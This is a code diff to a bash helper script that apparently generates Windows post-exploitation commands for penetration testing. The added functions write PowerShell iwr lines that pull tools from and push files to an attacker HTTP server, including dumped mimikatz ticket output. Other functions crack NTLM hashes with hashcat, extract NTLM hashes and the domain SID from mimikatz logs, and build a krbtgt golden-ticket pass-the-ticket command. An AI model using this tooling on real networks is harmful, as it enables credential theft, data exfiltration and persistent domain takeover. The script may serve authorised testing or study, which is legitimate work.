@@ -76,11 +76,28 @@ generate_certutil() {
 
 generate_iwr() { 
     local file=$1
+    local outfile=$2
+    if [[ -z $outfile ]]; then
+        outfile=$file
+    fi
     if [ -z "$http_ip" ] || [ -z "$http_port" ]; then
         echo "HTTP IP address and port must be set before running certutil."
         return 1
     fi
-    echo "iwr -uri http://$http_ip:$http_port/$file -OutFile $file ;"
+    echo "iwr -uri http://$http_ip:$http_port/$file -OutFile $outfile ;"
+}
+
+upload_file() {
+    local file=$1
+    local infile=$2
+    if [[ -z $infile ]]; then
+        infile=$file
+    fi
+    if [ -z "$file" ]; then
+        echo "File must be specified for upload."
+        return 1
+    fi
+    echo "iwr -Uri http://$http_ip:$http_port/$file -InFile $infile -Method Put ;"
 }
 
 create_add_user() {
@@ -132,9 +149,10 @@ create_change_password() {
 download_winPEAS () {
     if [ -f winPEASx64.exe ]; then
         echo "winPEASx64.exe already exists."
-        return
+    else
+        wget https://github.com/peass-ng/PEASS-ng/releases/download/20250701-bdcab634/winPEASx64.exe -O winPEASx64.exe
     fi
-    wget https://github.com/peass-ng/PEASS-ng/releases/download/20250701-bdcab634/winPEASx64.exe
+    generate_iwr "winPEASx64.exe"
 }
 
 escape_sed() {
@@ -203,4 +221,112 @@ run_mimikatz_kbtickets() {
     echo 'dir '$unc_path';'
     echo '.\mimikatz.exe "sekurlsa::tickets" exit > mimikatz_tickets.txt;'
     echo 'iwr -Uri http://'$http_ip':'$http_port'/mimikatz_tickets.txt -Infile mimikatz_tickets.txt -Method Put;'
+}
+
+run_mimikatz_export_tickets() {
+    echo '.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit;'
+}
+
+hashcat_ntlm() {
+    hash_mode=1000
+    hashcat_generic
+}
+
+hashcat_generic() {
+    if [[ -z "$hash_file" ]]; then
+        hash_file="hashes"
+    fi
+    if [[ ! -f "$hash_file" ]]; then
+        echo "$hash_file not found, cannot run hashcat"
+        return 1
+    fi
+    if [[ -z "$hashcat_rule" ]]; then
+        hashcat_rule="/usr/share/hashcat/rules/best64.rule"
+    fi
+    if [[ -z "$hashcat_wordlist" ]]; then
+        hashcat_wordlist="/usr/share/wordlists/rockyou.txt"
+    fi
+    if [[ -z "$hash_mode" ]]; then
+        echo "Hash mode must be set before running hashcat."
+        return 1
+    fi
+    echo "$hash_file found, running hashcat for hash mode $hash_mode"
+    sudo dos2unix $hash_file
+    hashcat -m $hash_mode $hash_file $hashcat_wordlist -r $hashcat_rule --force
+
+}
+
+get_ntlm_hash_from_mimikatz_log_logonpasswords() {
+    if [[ -z "$mimikatz_log" ]]; then
+        mimikatz_log="mimikatz_logonpasswords.txt"
+    fi
+    if [[ ! -f "$mimikatz_log" ]]; then
+        echo "$mimikatz_log not found, cannot extract NTLM hash"
+        return 1
+    fi
+    if [[ -z "$target_username" ]]; then
+        echo "Target username must be set before running."
+        return 1
+    fi
+    if [[ -z "$target_domain" ]]; then
+        echo "Target domain must be set before running."
+        return 1       
+    fi
+    sudo dos2unix $mimikatz_log >> /dev/null 2>&1
+    awk '
+        /'"$target_username"'/ {
+            if (getline > 0 && /'"$target_domain"'/) {            
+                if (getline > 0 && /NTLM/) {
+                    print $4
+                }
+            }
+        }
+    ' $mimikatz_log 
+}
+
+
+
+get_ntlm_hash_from_mimikatz_log_lsadump() {
+    if [[ -z "$mimikatz_log" ]]; then
+        mimikatz_log="mimikatz_lsadump.txt"
+    fi
+    if [[ ! -f "$mimikatz_log" ]]; then
+        echo "$mimikatz_log not found, cannot extract NTLM hash"
+        return 1
+    fi
+    if [[ -z "$target_username" ]]; then
+        echo "Target username must be set before running."
+        return 1
+    fi
+    sudo dos2unix $mimikatz_log >> /dev/null 2>&1
+    domain_sid=$(cat $mimikatz_log | grep -oP 'Domain.*/ \K.*')
+    ntlm_hash=$(awk '
+        /User : '"$target_username"'/ {
+            if (getline > 0 && /LM/) {
+                if (getline > 0 && /NTLM/) {
+                    print $3
+                }
+            }
+        }
+    ' $mimikatz_log )
+}
+
+get_golden_ticket() {
+    target_username=krbtgt
+    get_ntlm_hash_from_mimikatz_log_lsadump
+    if [[ $? -ne 0 ]]; then
+        return 1
+    fi
+    if [[ -z "$domain_sid" ]]; then
+        echo "Domain SID is not set, cannot create golden ticket."
+        return 1
+    fi
+    if [[ -z "$ntlm_hash" ]]; then
+        echo "NTLM hash is not set, cannot create golden ticket."
+        return 1
+    fi
+    get_mimikatz
+    get_psexec
+    echo '.\mimikatz.exe "kerberos::purge" exit'
+    echo '.\mimikatz.exe "kerberos::golden /user:'$username' /domain:'$domain' /sid:'$domain_sid' /'$target_username':'$ntlm_hash' /ptt" exit'
 }
